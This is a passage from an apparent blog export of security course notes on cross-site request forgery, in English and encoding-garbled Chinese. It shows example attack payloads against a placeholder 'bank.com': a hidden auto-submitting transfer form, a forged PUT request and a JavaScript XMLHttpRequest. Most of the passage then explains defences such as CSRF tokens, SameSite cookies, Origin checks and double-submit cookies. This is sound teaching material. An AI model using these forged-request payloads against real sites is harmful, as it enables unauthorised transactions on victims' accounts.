class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;amount&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;100000&quot;</span>/&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;æŸ¥çœ‹æˆ‘çš„å›¾ç‰‡ï¼&quot;</span>/&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Then, Charlie tricks Alice to click on the submit button<br>\nCan also be executed automatically using JavaScript</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>Example: Other HTTP Methods<br>\nCharlie can use HTTP PUT method that takes a JSON object as an argument</li>\n</ol>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">PUT</span> <span class=\"string\">http://bank.com/transfer.do</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   &quot;acct&quot;: &quot;CHARLIE&quot;,</span><br><span class=\"line\">   &quot;amount&quot;: 100000</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>Such requests can be executed with JavaScript</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"keyword\">function</span> <span class=\"title function_\">put</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> x = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">    x.<span class=\"title function_\">open</span>(<span class=\"string\">&quot;PUT&quot;</span>, <span class=\"string\">&quot;http://bank.com/transfer.do&quot;</span>, <span class=\"literal\">true</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    x.<span class=\"title function_\">setRequestHeader</span>(<span class=\"string\">&quot;Content-Type&quot;</span>, <span class=\"string\">&quot;application/json&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    x.<span class=\"title function_\">send</span>(<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(&#123;<span class=\"string\">&quot;acct&quot;</span>: <span class=\"string\">&quot;CHARLIE&quot;</span>, <span class=\"string\">&quot;amount&quot;</span>: <span class=\"number\">100000</span>&#125;));</span></span><br><span class=\"line\"><span class=\"language-javascript\">  &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"> </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Prevention CSRF\" class=\"active\"><a class=\"anchor\"  href=\"#Prevention CSRF\">#</a>Prevention CSRF</h2>\n<ol>\n<li>Prevention Methods That Do Not Work\n<ol>\n<li>ä½¿ç”¨ â€œç§˜å¯†â€ Cookie  (Using a secret cookie) ï¼šåœ¨è¯·æ±‚ä¸­åŠ å…¥ä¸€ä¸ª â€œç§˜å¯†â€ Cookieï¼Œç”¨æ¥éªŒè¯è¯·æ±‚çš„åˆæ³•æ€§ã€‚<br>\næ‰€æœ‰ Cookie éƒ½ä¼šåœ¨æ¯ä¸ªè¯·æ±‚ä¸­è¢«è‡ªåŠ¨å‘é€ï¼Œæ— è®ºæ˜¯åˆæ³•è¯·æ±‚è¿˜æ˜¯ä¼ªé€ è¯·æ±‚ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å—å®³è€…çš„æµè§ˆå™¨è‡ªåŠ¨å‘é€è¿™äº› Cookieã€‚</li>\n<li>ä»…æ¥å— POST è¯·æ±‚ (Only accepting POST requests) ï¼šé™åˆ¶ä»…æ¥å— POST è¯·æ±‚æ¥æäº¤æ•æ„Ÿæ“ä½œçš„æ•°æ®ã€‚<br>\næ”»å‡»è€…ä»ç„¶å¯ä»¥é€šè¿‡ HTML è¡¨å•ã€AJAX è¯·æ±‚æˆ–è‡ªåŠ¨æäº¤è„šæœ¬ï¼Œè¯±å¯¼å—å®³è€…æäº¤ä¼ªé€ çš„ POST è¯·æ±‚ã€‚å› æ­¤ï¼Œä»…ä½¿ç”¨ POST è¯·æ±‚å¹¶ä¸èƒ½å®Œå…¨é˜²æ­¢ CSRFã€‚</li>\n<li>å¤šæ­¥äº‹åŠ¡å¤„ç† (Multi-step transactions) ï¼šå°†æ“ä½œåˆ†è§£ä¸ºå¤šä¸ªæ­¥éª¤ï¼Œå¹¶åœ¨æ¯ä¸€æ­¥ä¸­è¿›è¡Œç”¨æˆ·ç¡®è®¤ã€‚ï¼š<br>\næ”»å‡»è€…å¯èƒ½é€šè¿‡è§‚å¯Ÿæˆ–çŒœæµ‹ï¼Œé¢„æµ‹æ¯ä¸€æ­¥çš„ç»“æœï¼Œå¹¶æ¨¡æ‹Ÿå®Œæ•´çš„äº‹åŠ¡æµç¨‹ã€‚å¦‚æœæ²¡æœ‰é¢å¤–çš„ä¿æŠ¤æœºåˆ¶ï¼ˆå¦‚ CSRF ä»¤ç‰Œï¼‰ï¼Œå¤šæ­¥æµç¨‹ä»ç„¶æ˜“å— CSRF æ”»å‡»ã€‚</li>\n<li>URL é‡å†™ (URL Rewriting)ï¼š åœ¨ URL ä¸­åŒ…å«ç”¨æˆ·çš„ä¼šè¯ ID ä»¥ç»´æŠ¤çŠ¶æ€ã€‚<br>\nå°†ä¼šè¯ ID æš´éœ²åœ¨ URL ä¸­ï¼Œä¼šå¢åŠ è¢«æˆªè·æˆ–æ³„éœ²çš„é£é™©ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ç½‘ç»œæµé‡åˆ†æã€ä»£ç†æ—¥å¿—ã€æµè§ˆå™¨å†å²è®°å½•ç­‰æ–¹å¼è·å–ä¼šè¯ IDã€‚</li>\n<li>HTTPSï¼šä½¿ç”¨ HTTPS æ¥åŠ å¯†é€šä¿¡å†…å®¹ã€‚<br>\nHTTPS åªèƒ½åŠ å¯†ä¼ è¾“çš„å†…å®¹ï¼Œä¸èƒ½é˜²æ­¢ä¼ªé€ çš„è¯·æ±‚ã€‚æ”»å‡»è€…ä»å¯ä»¥é€šè¿‡å—å®³è€…çš„æµè§ˆå™¨å‘é€æœ‰æ•ˆçš„ CSRF æ”»å‡»è¯·æ±‚ï¼Œå“ªæ€•æ˜¯ HTTPS åŠ å¯†çš„è¯·æ±‚ã€‚</li>\n</ol>\n</li>\n<li>Prevent CSRF: Token-based mitigation</li>\n</ol>\n<ul>\n<li>A CSRF token is a unique, secret, unpredictable value\n<ul>\n<li>Generated by web applications and included on their own web pages<br>\n <code>http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&amp;token=31415926535</code></li>\n</ul>\n</li>\n<li>Web applications reject requests if the token is missing or invalid\n<ul>\n<li>Impossible for an attacker to guess the token and construct a fully valid HTTP request</li>\n</ul>\n</li>\n<li>Types of CSRF tokens\n<ul>\n<li>Synchroniser token åŒæ­¥ä»¤ç‰Œï¼š\n<ul>\n<li>æœåŠ¡ç«¯ä¸ºæ¯ä¸ªä¼šè¯ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ä»¤ç‰Œï¼Œå¹¶åœ¨è¯·æ±‚ä¸­éªŒè¯è¯¥ä»¤ç‰Œã€‚</li>\n<li>å…¸å‹çš„åšæ³•æ˜¯åœ¨è¡¨å•ä¸­åµŒå…¥ä¸€ä¸ªéšè—å­—æ®µï¼Œæˆ–åœ¨ URL ä¸­é™„åŠ è¯¥ä»¤ç‰Œã€‚</li>\n<li>ç¼ºç‚¹æ˜¯éœ€è¦åœ¨æœåŠ¡ç«¯ä¿å­˜å’Œç®¡ç†ä»¤ç‰Œã€‚</li>\n</ul>\n</li>\n<li>encryption-based token åŠ å¯†ä»¤ç‰Œï¼š\n<ul>\n<li>ä½¿ç”¨åŠ å¯†ç®—æ³•å°†ç”¨æˆ·ä¿¡æ¯å’Œæ—¶é—´æˆ³åŠ å¯†ï¼Œç”Ÿæˆå”¯ä¸€çš„ä»¤ç‰Œã€‚</li>\n<li>è¿™ç§ä»¤ç‰Œä¸éœ€è¦æœåŠ¡ç«¯å­˜å‚¨ï¼Œå› ä¸ºå®ƒå¯ä»¥é€šè¿‡è§£å¯†æ¥éªŒè¯è¯·æ±‚çš„æœ‰æ•ˆæ€§ã€‚</li>\n</ul>\n</li>\n<li>hash-based token å“ˆå¸Œä»¤ç‰Œï¼š\n<ul>\n<li>ä½¿ç”¨ç”¨æˆ·ä¼šè¯ä¿¡æ¯ã€è¯·æ±‚å‚æ•°ç­‰ä½œä¸ºè¾“å…¥ï¼Œç”Ÿæˆä¸€ä¸ªå“ˆå¸Œå€¼ä½œä¸ºä»¤ç‰Œã€‚</li>\n<li>é€šå¸¸é€šè¿‡åŠ ç›ï¼ˆsaltï¼‰æ¥å¢åŠ ä»¤ç‰Œçš„å¤æ‚æ€§å’Œä¸å¯é¢„æµ‹æ€§ã€‚</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Prevent CSRF: Defence-in-depth techniques</li>\n</ol>\n<ul>\n<li>SameSite Cookie Attribute\n<ul>\n<li>Prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts</li>\n<li>å¦‚ä½•é˜²æŠ¤ï¼šè®¾ç½® <code>SameSite</code>  å±æ€§ä¸º <code>Strict</code>  æˆ– <code>Lax</code> ï¼Œé˜²æ­¢æµè§ˆå™¨åœ¨è·¨ç«™æµè§ˆç¯å¢ƒä¸­å‘é€ Cookieï¼Œä»è€Œé˜»æ­¢ CSRF æ”»å‡»ã€‚<br>\n <code>SameSite=Strict</code> ï¼šCookie ä»…åœ¨åŒä¸€ç«™ç‚¹è¯·æ±‚æ—¶å‘é€ï¼Œå®Œå…¨é˜»æ­¢è·¨ç«™è¯·æ±‚ã€‚<br>\n <code>SameSite=Lax</code> ï¼šCookie å…è®¸åœ¨å°‘æ•°è·¨ç«™è¯·æ±‚ä¸­å‘é€ï¼ˆå¦‚ GET è¯·æ±‚æˆ–å¯¼èˆªï¼‰ï¼Œä½†ä¼šé™åˆ¶å¤§å¤šæ•°æƒ…å†µä¸‹çš„è·¨ç«™è¯·æ±‚</li>\n<li>ç¤ºä¾‹ï¼š</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Set-Cookie</span><span class=\"punctuation\">: </span>sessionId=abc123; SameSite=Strict;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Verifying Origin With Standard Headers\n<ul>\n<li>Determine and match both the source and target of a request</li>\n<li>å¦‚ä½•é˜²æŠ¤ï¼šWeb åº”ç”¨æœåŠ¡å™¨æ£€æŸ¥è¯·æ±‚çš„ Origin æˆ– Referer å¤´ï¼Œå¹¶ç¡®ä¿å®ƒä»¬ä¸åº”ç”¨çš„åŸŸåŒ¹é…ã€‚<br>\nä»…å…è®¸æ¥è‡ªå¯ä¿¡åŸŸçš„è¯·æ±‚è¿›è¡Œå¤„ç†ã€‚</li>\n<li>ç¤ºä¾‹ï¼šå¯¹äºé“¶è¡Œè½¬è´¦è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°†ç¡®ä¿è¯·æ±‚çš„æ¥æºä¸º <code>https://bank.com</code> ã€‚</li>\n</ul>\n</li>\n<li>Double Submit Cookie\n<ul>\n<li>Every transaction request must include a random value in both a cookie and as a request parameter</li>\n<li>å¦‚ä½•é˜²æŠ¤ï¼š<br>\nç”¨æˆ·åœ¨ç™»å½•æ—¶ç”Ÿæˆä¸€ä¸ªéšæœºå€¼ï¼Œå¹¶åœ¨åç»­çš„æ¯ä¸ªè¯·æ±‚ä¸­å°†è¯¥å€¼åŒæ—¶åŒ…å«åœ¨ Cookie å’Œè¯·æ±‚å‚æ•°ä¸­ã€‚<br>\næœåŠ¡å™¨æ£€æŸ¥è¿™ä¸¤ä¸ªå€¼æ˜¯å¦åŒ¹é…ï¼Œä¸åŒ¹é…åˆ™æ‹’ç»è¯·æ±‚ã€‚</li>\n<li>ä¼˜åŠ¿ï¼šæ”»å‡»è€…æ— æ³•åŒæ—¶æ§åˆ¶ Cookie å’Œè¯·æ±‚å‚æ•°ï¼Œé˜²æ­¢äº† CSRF æ”»å‡»ã€‚</li>\n<li>ç¤ºä¾‹ï¼š</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Set cookie</span><br><span class=\"line\"> Set-Cookie: csrfToken=xyz123;</span><br><span class=\"line\"></span><br><span class=\"line\"> // Form submission includes the token</span><br><span class=\"line\"> POST /transfer</span><br><span class=\"line\"> Cookie: csrfToken=xyz123</span><br><span class=\"line\"> Body: token=xyz123&amp;acct=CHARLIE&amp;amount=1000</span><br></pre></td></tr></table></figure>\n<ul>\n<li>User Interaction\n<ul>\n<li>Involve the user in the transaction (e.g. one-time verification code, CAPTCHA, etc.)</li>\n<li>å¦‚ä½•é˜²æŠ¤ï¼šåœ¨é‡è¦æ“ä½œï¼ˆå¦‚è½¬è´¦ã€å¯†ç ä¿®æ”¹ç­‰ï¼‰ä¸­ä½¿ç”¨ä¸€æ¬¡æ€§éªŒè¯ç ï¼ˆOTPï¼‰ã€CAPTCHA æˆ–ç±»ä¼¼æœºåˆ¶ï¼Œè¦æ±‚ç”¨æˆ·ä¸»åŠ¨ç¡®è®¤æ“ä½œã€‚<br>\né€šè¿‡ç”¨æˆ·çš„ä¸»åŠ¨å‚ä¸ï¼Œç¡®ä¿è¯·æ±‚æ˜¯ç”±ç”¨æˆ·å‘èµ·çš„ï¼Œè€Œä¸æ˜¯ç”±æ¶æ„è„šæœ¬ä¼ªé€ çš„ã€‚</li>\n<li>ä¼˜åŠ¿ï¼šé˜»æ­¢è‡ªåŠ¨åŒ– CSRF æ”»å‡»ï¼Œæé«˜äº†ç”¨æˆ·æ“ä½œçš„å®‰å…¨æ€§ã€‚</li>\n<li>ç¤ºä¾‹ï¼šåœ¨è½¬è´¦é¡µé¢ä¸­è¦æ±‚ç”¨æˆ·è¾“å…¥å‘é€åˆ°å…¶æ‰‹æœºçš„ä¸€æ¬¡æ€§éªŒè¯ç ï¼ˆOTPï¼‰ã€‚</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"XSS VS CSRF\" class=\"active\"><a class=\"anchor\"  href=\"#XSS VS CSRF\">#</a>XSS VS CSRF</h1>\n<table>\n<thead>\n<tr>\n<th>æ–¹é¢</th>\n<th>XSS (Cross-Site Scripting)</th>\n<th>CSRF (Cross-Site Request Forgery)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>æ”»å‡»ç›®æ ‡</td>\n<td>æ‰§è¡Œæ¶æ„ä»£ç ï¼Œæ§åˆ¶ç”¨æˆ·æµè§ˆå™¨</td>\n<td>åˆ©ç”¨ç”¨æˆ·çš„èº«ä»½è®¤è¯ï¼Œè¿›è¡Œæœªæˆæƒè¯·æ±‚</td>\n</tr>\n<tr>\n<td>å±å®³</td>\n<td>çªƒå–æ•æ„Ÿä¿¡æ¯ã€åŠ«æŒä¼šè¯ã€æ“çºµç½‘é¡µå†…å®¹</td>\n<td>æœªæˆæƒæ›´æ”¹æ•°æ®ã€æäº¤è¡¨å•ç­‰æ•æ„Ÿæ“ä½œ</td>\n</tr>\n<tr>\n<td>åŸç†</td>\n<td>æ³¨å…¥æ¶æ„ä»£ç ï¼Œä½¿æµè§ˆå™¨æ‰§è¡Œæ”»å‡»è€…çš„è„šæœ¬</td>\n<td>åˆ©ç”¨ç”¨æˆ·çš„å·²ç™»å½•çŠ¶æ€ï¼Œå‘é€ä¼ªé€ çš„è¯·æ±‚</td>\n</tr>\n<tr>\n<td>é˜²å¾¡æªæ–½</td>\n<td>è¾“å…¥è¿‡æ»¤ã€å†…å®¹å®‰å…¨ç­–ç•¥ (CSP)ã€HttpOnly Cookie</td>\n<td>CSRF ä»¤ç‰Œã€æ£€æŸ¥ Referer Headerã€SameSite Cookie</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": [
                "software security",
                "HTTP",
                "XSS",
                "CSRF"
            ]
        }
    ]
}